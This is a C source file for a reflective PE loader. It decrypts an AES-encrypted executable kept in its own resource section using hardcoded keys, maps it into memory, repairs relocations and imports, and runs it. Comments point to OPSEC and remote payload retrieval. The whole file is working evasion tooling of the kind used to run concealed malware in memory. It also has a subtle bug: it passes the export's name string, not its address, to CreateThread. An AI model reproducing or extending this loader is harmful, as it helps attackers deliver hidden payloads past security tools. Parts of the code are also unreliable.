/*
	Author: MochaByte
	Date: 01.09.2025

	Steps a PE Loader needs to do:
	1. Fix relocations
	2. Repair the IAT
	3. Fix memory permissions

	After this, most PE's can be loaded without issues. There could be still exceptions where TLS callbacks are used. It's possible to cover these aswell, at least to a certain degree.
	Another aspect to consider is if the target PE register exceptions handlers. Those are defined in a separate directory (Exception Directory).

	So, addition steps would be:

	4. Support for TLS callbacks
	5. Register potential exceptions handlers

*/

#include <stdio.h>

#include "structs.h"
#include "AES_128_CBC.h"
#include "resource.h"

BOOL PopulateStruct(PBYTE pPe, PHEADERS pPeStruct) {

	// Quick check
	if (!pPe || !pPeStruct) {

		PRINT_ERR("No PE file detected");
		return FALSE;
	}

	// Starting to populate the struct
	pPeStruct->pDOSHeader = (PIMAGE_DOS_HEADER)pPe;
	pPeStruct->pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pPe + pPeStruct->pDOSHeader->e_lfanew);

	// Quick check to ensure we are good
	if (pPeStruct->pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE || pPeStruct->pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {

		PRINT_ERR("Something went wrong, couldn't get DOS / NT header");
		return FALSE;
	}

	// Getting to the sections
	pPeStruct->pSectionHeader	= IMAGE_FIRST_SECTION(pPeStruct->pNTHeaders);
	pPeStruct->pBaseRelocTable	= &pPeStruct->pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeStruct->pImportAddrTable = &pPeStruct->pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeStruct->pExportDirectory = &pPeStruct->pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// The "Optional" Stuff
	pPeStruct->pExceptionDirectory	= &pPeStruct->pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeStruct->pTlsDirectory		= &pPeStruct->pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	// Finally, we also check if the PE is a DLL or not
	pPeStruct->isDll = (pPeStruct->pNTHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;

	return TRUE;
}

// Function to map an image from raw bytes
PBYTE MapImageFromFileBytes(PBYTE fileBase)
{
	PIMAGE_DOS_HEADER DosHdr = (PIMAGE_DOS_HEADER)fileBase;
	PIMAGE_NT_HEADERS NTHdrs = (PIMAGE_NT_HEADERS)(fileBase + DosHdr->e_lfanew);

	SIZE_T sizeImage = NTHdrs->OptionalHeader.SizeOfImage;
	SIZE_T sizeHeaders = NTHdrs->OptionalHeader.SizeOfHeaders;

	PBYTE  mapped = (PBYTE)VirtualAlloc(NULL, sizeImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!mapped) return NULL;

	// copying headers
	memcpy(mapped, fileBase, sizeHeaders);

	// copy each section to its VirtualAddress
	PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(NTHdrs);
	for (WORD i = 0; i < NTHdrs->FileHeader.NumberOfSections; ++i, ++sh) {
		PBYTE dst = mapped + sh->VirtualAddress;
		PBYTE src = fileBase + sh->PointerToRawData;

		SIZE_T toCopy = min((SIZE_T)sh->SizeOfRawData, (SIZE_T)sh->Misc.VirtualSize);
		if (toCopy) memcpy(dst, src, toCopy);

		// zero the remainder up to VirtualSize
		if (sh->Misc.VirtualSize > toCopy) {
			
			memset(dst + toCopy, 0, sh->Misc.VirtualSize - toCopy);
		}
	}
	// returning the mapped PE
	return mapped;
}

// Function to get the payload from the .rsrc section. Could/Should be improved with a custom function for better OPSEC
// Other "retrieval" methods could be implemented aswell as getting the payload remotely
BOOL GetPayload(OUT PVOID* ppPayload, OUT SIZE_T* pszSizeOfPayload) {

	HGLOBAL hGlobal = NULL;
	HRSRC hRsrc = NULL;
	PVOID pEncPayload = NULL;
	SIZE_T sEncPayloadSize = NULL;

	// Searching the payload in .rsrc section
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {

		PRINT_ERR("Couldn't locate payload in .rsrc section");
		return FALSE;
	}

	// Loading the resource next
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {

		PRINT_ERR("Couldn't load the resource");
		return FALSE;
	}

	// Get the address of our payload 
	pEncPayload = LockResource(hGlobal);
	if (pEncPayload == NULL) {

		PRINT_ERR("Couldn't get the address of payload");
		return FALSE;
	}

	// Get the size of our payload 
	sEncPayloadSize = SizeofResource(NULL, hRsrc);
	if (sEncPayloadSize == NULL) {

		PRINT_ERR("Couldn't get the size of payload");
		return FALSE;
	}

	// Preparing "return values"
	*ppPayload			= pEncPayload;
	*pszSizeOfPayload	= sEncPayloadSize;

	return TRUE;
}

// Function to fix/adjust the relocations
BOOL AdjustRelocations(IN PHEADERS pPeStruct, IN ULONG_PTR pPayloadAddr) {

	// This is the preferred address of the target PE
	ULONG_PTR pPrefAddr = pPeStruct->pNTHeaders->OptionalHeader.ImageBase;
	// Checking if a .reloc section exists / if it was filled correctly
	if (pPeStruct->pBaseRelocTable->VirtualAddress == 0 || pPeStruct->pBaseRelocTable->Size == 0) {

		PRINT_INF("Relocation Section does not exist");
		return TRUE;
	}

	// Next we get the delta of the preffered address and the *actual* address of the PE
	ULONG_PTR delta = pPayloadAddr - pPrefAddr;
	// Very first blob of the contiguous block
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((UINT8*)pPayloadAddr + pPeStruct->pBaseRelocTable->VirtualAddress);
	// Creating a counter for the loop
	DWORD processed = 0;

	while (processed < pPeStruct->pBaseRelocTable->Size) {

		// Quick sanity check
		if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {

			PRINT_ERR("Size of the curent SizeBlock doesn't match to IMAGE_BASE_RELOCATION");
			return FALSE;
		}
 
		// Eeach _IMAGE_BASE_RELOCATION block has two entries. The RVA and its Size. 
		UINT32 pageRVA = block->VirtualAddress;
		UINT32 count = (block->SizeOfBlock - sizeof(*block)) / sizeof(WORD);
		WORD* entries = (WORD*)(block + 1);

		for (UINT32 i = 0; i < count; i++) {

			// Getting the upper and lower positions of each entry
			WORD entryPosition = entries[i];
			WORD type = entryPosition >> 12;
			WORD lowerPosition = entryPosition & 0x0FFF;

			// Address to patch
			UINT8* patch = (UINT8*)(pPayloadAddr + pageRVA + lowerPosition);

			// Checking the type of relocation
			switch(type) {

				// No patching needed
				case IMAGE_REL_BASED_ABSOLUTE:
					break;

				// 32 Bit
				case IMAGE_REL_BASED_HIGHLOW: {

					UINT32* pHighlow = (UINT32*)patch;
					*pHighlow += (UINT32)delta;
					break;
				}

				// 64 bit
				case IMAGE_REL_BASED_DIR64: {

					UINT64* pDir64 = (UINT64*)patch;
					*pDir64 += (UINT64)delta;
					break;
				}

				default: 
					return FALSE;
			}

		}

		// The current block has been processed, we move to the next one
		processed += block->SizeOfBlock;
		block = (IMAGE_BASE_RELOCATION*)((UINT8*)block + block->SizeOfBlock);
	}
	
	return TRUE;

}

BOOL FixMemoryPermissions(IN PHEADERS pStruct, IN PBYTE pBaseAddr) {

	NTSTATUS status = 0x00;

	// Looping through all the sections the PE has
	for (SIZE_T i = 0; i < pStruct->pNTHeaders->FileHeader.NumberOfSections; i++) {

		DWORD	oldProtection = 0,
				currentProtection = 0;

		// If the section is empty we skip it
		if (!pStruct->pSectionHeader[i].SizeOfRawData || !pStruct->pSectionHeader[i].VirtualAddress)
			continue;

		if (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			currentProtection = PAGE_WRITECOPY;

		if (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			currentProtection = PAGE_READONLY;

		if ((pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			currentProtection = PAGE_READWRITE;

		if (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			currentProtection = PAGE_EXECUTE;

		if ((pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			currentProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			currentProtection = PAGE_EXECUTE_READ;

		if ((pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pStruct->pSectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			currentProtection = PAGE_EXECUTE_READWRITE;

		// Applying the real memory protections
		if (!VirtualProtect((PVOID)(pBaseAddr + pStruct->pSectionHeader[i].VirtualAddress), pStruct->pSectionHeader[i].SizeOfRawData, currentProtection, &oldProtection)) {
			PRINT_ERR("FixMemoryPermissions: VirtualProtect failed");
			return FALSE;
		}

	}

	return TRUE;
}

BOOL RepairIAT(IN PHEADERS pStructPe, IN PBYTE pBaseAddr, IN OPTIONAL IatHookCallback hookOpt) {

	if (!pBaseAddr || !pStructPe) {

		PRINT_ERR("RepairIAT: Failed to initialize pStructPe or pBaseAddr");
		return FALSE;
	}

	// Checking if imports exists, which will most likely be the case
	if (!pStructPe->pImportAddrTable->VirtualAddress || !pStructPe->pImportAddrTable->Size) {

		PRINT_SUCC("No Imports detected. Continuing");
		return TRUE;
	}

	// Initializing an entry
	PIMAGE_IMPORT_DESCRIPTOR pOneSection = NULL;

	// counter
	DWORD parsed = 0;

	// Looping over each IMAGE_IMPORT_DESCRIPTOR Struct
	while (parsed + sizeof(IMAGE_IMPORT_DESCRIPTOR) <= pStructPe->pImportAddrTable->Size) {

		// This is the current entry
		pOneSection = (PIMAGE_IMPORT_DESCRIPTOR)(pBaseAddr + pStructPe->pImportAddrTable->VirtualAddress + parsed);

		// If Null descriptor, than we reached the end
		if (pOneSection->OriginalFirstThunk == 0 && pOneSection->FirstThunk == 0 && pOneSection->Name == 0)
			break;

		// We got the DLL name
		LPCSTR dllName = (LPCSTR)(pBaseAddr + pOneSection->Name);

		// Module containing the DLL
		HMODULE hModule = NULL;

		// We can now load the DLL
		if (!(hModule = LoadLibraryA(dllName))) {

			PRINT_ERR("RepairIAT: Failed to load the DLL");
			return FALSE;
		}

		// Points to the IAT of that DLL
		IMAGE_THUNK_DATA* IAT = (IMAGE_THUNK_DATA*)(pBaseAddr + pOneSection->FirstThunk);
		// Points ot the ILT of that DLL
		IMAGE_THUNK_DATA* ILT = (pOneSection->OriginalFirstThunk) ? (IMAGE_THUNK_DATA*)(pBaseAddr + pOneSection->OriginalFirstThunk) : IAT;

		SIZE_T n = 0;
		// "Scanning" the entries of the ILT
		while (ILT[n].u1.AddressOfData) ++n; // Stopping on NULL entry

		// We walk through each THUNK and resolve the function either through ordinal or the function name
		for (SIZE_T i = 0; i < n; ++i) {

			FARPROC addr = NULL;
			LPCSTR funcName = NULL;

			// Resolve by ordinal
			if (IMAGE_SNAP_BY_ORDINAL(ILT[i].u1.Ordinal)) {

				WORD ordinal = (WORD)IMAGE_ORDINAL(ILT[i].u1.Ordinal);
				addr = GetProcAddress(hModule, (LPCSTR)(ULONG_PTR)ordinal);
			
			}
			// Resolved by name
			else {

				IMAGE_IMPORT_BY_NAME* ImportByName = (IMAGE_IMPORT_BY_NAME*)(pBaseAddr + ILT[i].u1.AddressOfData);
				funcName = (LPCSTR)ImportByName->Name;
				addr = GetProcAddress(hModule, funcName);
			}

			// Optional CMD-Line argument hooking/spoofing
			if (hookOpt) {

				FARPROC override = NULL;
				FARPROC used = hookOpt(dllName, funcName ? funcName : "", (FARPROC)addr, &override);
				// swapping here
				if (used) addr = used; 

			}

#ifdef _WIN64
			IAT[i].u1.Function = (ULONGLONG)addr;
#else
			IAT[i].u1.Function = (DWORD)addr;
#endif
		}

		parsed += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	return TRUE;
}

BOOL ExecuteTLS(IN PHEADERS pStruct, IN PBYTE pBaseAddr) {

	// If there are any TLS callbacks
	if (pStruct->pTlsDirectory->Size) {

#ifdef _WIN64
		PIMAGE_TLS_DIRECTORY TLS = (PIMAGE_TLS_DIRECTORY64)(pBaseAddr + pStruct->pTlsDirectory->VirtualAddress);
		if (!TLS->AddressOfCallBacks) 
			return TRUE;

		// VA of the callback
		PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)TLS->AddressOfCallBacks;
#else
		PIMAGE_TLS_DIRECTORY TLS = (PIMAGE_TLS_DIRECTORY32)(pBaseAddr + pStruct->pTlsDirectory->VirtualAddress);
		if (!TLS->AddressOfCallBacks)
			return TRUE;

		// VA of the callback
		PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)TLS->AddressOfCallBacks;
#endif

		for (int i = 0; callback[i] != NULL; i++) {

			callback[i]((LPVOID)pBaseAddr, DLL_PROCESS_ATTACH, NULL);
		}
			
		PRINT_SUCC("TLS Callbacks executed");
	}

	return TRUE;
}

BOOL RegisterExceptionsHandlers(IN PHEADERS pStruct, IN PBYTE pBaseAddr) {

	// If there are any handlers registered
	if (pStruct->pExceptionDirectory->Size) {

		PIMAGE_RUNTIME_FUNCTION_ENTRY entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pBaseAddr + pStruct->pExceptionDirectory->VirtualAddress);
		
		// Registering it
		if (!RtlAddFunctionTable(entry, (pStruct->pExceptionDirectory->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), pBaseAddr)) {

			PRINT_ERR("RtlAddFunctionTable failed");
			return FALSE;
		}
	
		PRINT_SUCC("Registered Exceptions Handlers");
	}

	return TRUE;
}

// Get Exported functions if any
PVOID GetExportedFunc(IN const PIMAGE_DATA_DIRECTORY pExportDir,IN ULONG_PTR imageBase, IN LPCSTR funcName) {
	
	if (!pExportDir || !pExportDir->VirtualAddress || !pExportDir->Size || !funcName || !*funcName)
		return NULL;

	PIMAGE_EXPORT_DIRECTORY exp =
		(PIMAGE_EXPORT_DIRECTORY)(imageBase + pExportDir->VirtualAddress);

	PDWORD nameRVAs = (PDWORD)(imageBase + exp->AddressOfNames);            
	PDWORD funcRVAs = (PDWORD)(imageBase + exp->AddressOfFunctions);        
	PWORD  ordIdx = (PWORD)(imageBase + exp->AddressOfNameOrdinals);    

	// Search by name over NumberOfNames (not NumberOfFunctions!)
	for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
		const CHAR* curName = (const CHAR*)(imageBase + nameRVAs[i]);
		if (strcmp(curName, funcName) != 0)
			continue;

		WORD  idx = ordIdx[i];               // index into AddressOfFunctions
		DWORD rva = funcRVAs[idx];

		// Forwarded export? (RVA points back inside the export directory blob)
		DWORD expStart = pExportDir->VirtualAddress;
		DWORD expEnd = expStart + pExportDir->Size;
		if (rva >= expStart && rva < expEnd) {
			const char* fwd = (const char*)(imageBase + rva);
			const char* dot = strchr(fwd, '.');
			if (!dot) return NULL;

			// Extracting DLL part
			char dll[128];
			size_t dlen = (size_t)(dot - fwd);
			if (dlen == 0 || dlen >= sizeof(dll)) return NULL;
			memcpy(dll, fwd, dlen);
			dll[dlen] = '\0';

			const char* api = dot + 1;

			// Load target DLL (accept with/without ".dll")
			HMODULE h = LoadLibraryA(dll);
			if (!h) {
				char tmp[160];
				if (_snprintf_s(tmp, sizeof(tmp), _TRUNCATE, "%s.dll", dll) <= 0) return NULL;
				h = LoadLibraryA(tmp);
			}
			if (!h) return NULL;

			if (api[0] == '#') {
				int ord = atoi(api + 1);
				return (PVOID)GetProcAddress(h, (LPCSTR)(ULONG_PTR)ord);
			}
			else {
				return (PVOID)GetProcAddress(h, api);
			}
		}

		// Normal export: RVA → VA
		return (PVOID)(imageBase + rva);
	}

	return NULL; 
}


int main() {

	// Change this. You get the output from ObfusX
	uint8_t aes_k[16] = { 0x78, 0x14, 0x27, 0xae, 0x10, 0xba, 0x4b, 0x51, 0xc1, 0x1a, 0xd7, 0xe9, 0x11, 0xc1, 0x64, 0xcd };
	uint8_t aes_i[16] = { 0x8d, 0x31, 0xe5, 0x6c, 0x7b, 0x52, 0xa8, 0x2e, 0x36, 0x59, 0xbb, 0x2f, 0x44, 0x92, 0x9c, 0xa5 };

	// Decryption context
	AES_CTX		ctx;
	PVOID		pEncryptedPayload	= NULL,
				pDecryptedPayload	= NULL,
				pEntryPoint			= NULL,
				pExportedFunc		= NULL;
	PBYTE	pBaseAddr = NULL;
	SIZE_T	szPayload = NULL;
	HEADERS pStruct = { 0 };
	LPCSTR cExportedFuncName = FUNCTION_NAME;


	// Getting the PE from the .rsrc section first
	if (!GetPayload(&pEncryptedPayload, &szPayload)) {

		PRINT_ERR("GetPayload() failed");
		return -1;
	}

	PRINT_SUCC("Got encrypted PE at: 0x%p", pEncryptedPayload);

	// Decrypting the PE
	pDecryptedPayload = (PBYTE)malloc(szPayload);
	AES_DecryptInit(&ctx, aes_k, aes_i);
	AES_DecryptBuffer(&ctx, pEncryptedPayload, pDecryptedPayload, szPayload);

	PRINT_SUCC("Decrypted PE at: 0x%p", pDecryptedPayload);

	// First mapping the PE instead of reading raw bytes
	pBaseAddr = MapImageFromFileBytes((PBYTE)pDecryptedPayload);
	if (!pBaseAddr) {

		PRINT_ERR("MapImageFromFileBytes() failed");
		return -1;
	}

	// Populating the PE structure now
	if (!PopulateStruct(pBaseAddr, &pStruct)) {

		PRINT_ERR("PopulateStruct() failed");
		return -1;
	}

	PRINT_SUCC("Populated the PHEADERS struct");

	// Adjusting relocations
	if (!AdjustRelocations(&pStruct, (ULONG_PTR)pBaseAddr)) {

		PRINT_ERR("AdjustRelocations() failed");
		return -1;
	}


	PRINT_SUCC("Relocations fixed");

	if (!RepairIAT(&pStruct, pBaseAddr, CmdlineHookCB)) {

		PRINT_ERR("Fixing IAT failed");
		return -1;
	}

	PRINT_SUCC("IAT repaired");

	if (!FixMemoryPermissions(&pStruct, pBaseAddr)) {

		PRINT_ERR("Fixing Memory Protections failed");
		return -1;
	}

	PRINT_SUCC("Memory Protections fixed");

	// Registering Exceptions Handlers if any
	if (!RegisterExceptionsHandlers(&pStruct, pBaseAddr)) {

		PRINT_ERR("RegisterExceptionsHandlers() failed");
		return -1;
	}

	// If any TLS callbacks, execute them now
	if (!ExecuteTLS(&pStruct, pBaseAddr)) {

		PRINT_ERR("ExecuteTLS() failed");
		return -1;
	}

	// Checking if there's any exported function
	if (pStruct.pExportDirectory->Size && pStruct.pExportDirectory->VirtualAddress && cExportedFuncName) {

		pExportedFunc = GetExportedFunc(pStruct.pExportDirectory, pBaseAddr, cExportedFuncName);
	}

	// We can now check if its a DLL nor not and execute the PE
	pEntryPoint = (PVOID)(pBaseAddr + pStruct.pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	if (pEntryPoint == NULL) {

		PRINT_ERR("Entry Point could not be found");
		return -1;
	}

	// You can your ARGS here
	if (PE_ARGS != NULL)
		SetMappedModuleArgsW(L"DoesNotMatter", PE_ARGS);

	// PE is a DLL
	if (pStruct.isDll) {

		DLLMAIN dllmain = (DLLMAIN)pEntryPoint;
		HANDLE	hHandle = NULL;

		dllmain((HINSTANCE)pBaseAddr, DLL_PROCESS_ATTACH, NULL);
		if (cExportedFuncName)
			hHandle = CreateThread(NULL, 0, cExportedFuncName, NULL, 0, NULL);
		if (hHandle)
			WaitForSingleObject(hHandle, INFINITE);

	}
	// PE is an EXE
	else {

		PRINT_INF("Launching PE..");
		MAIN mainfunc = (MAIN)pEntryPoint;
		mainfunc();
	}

	return 0;
}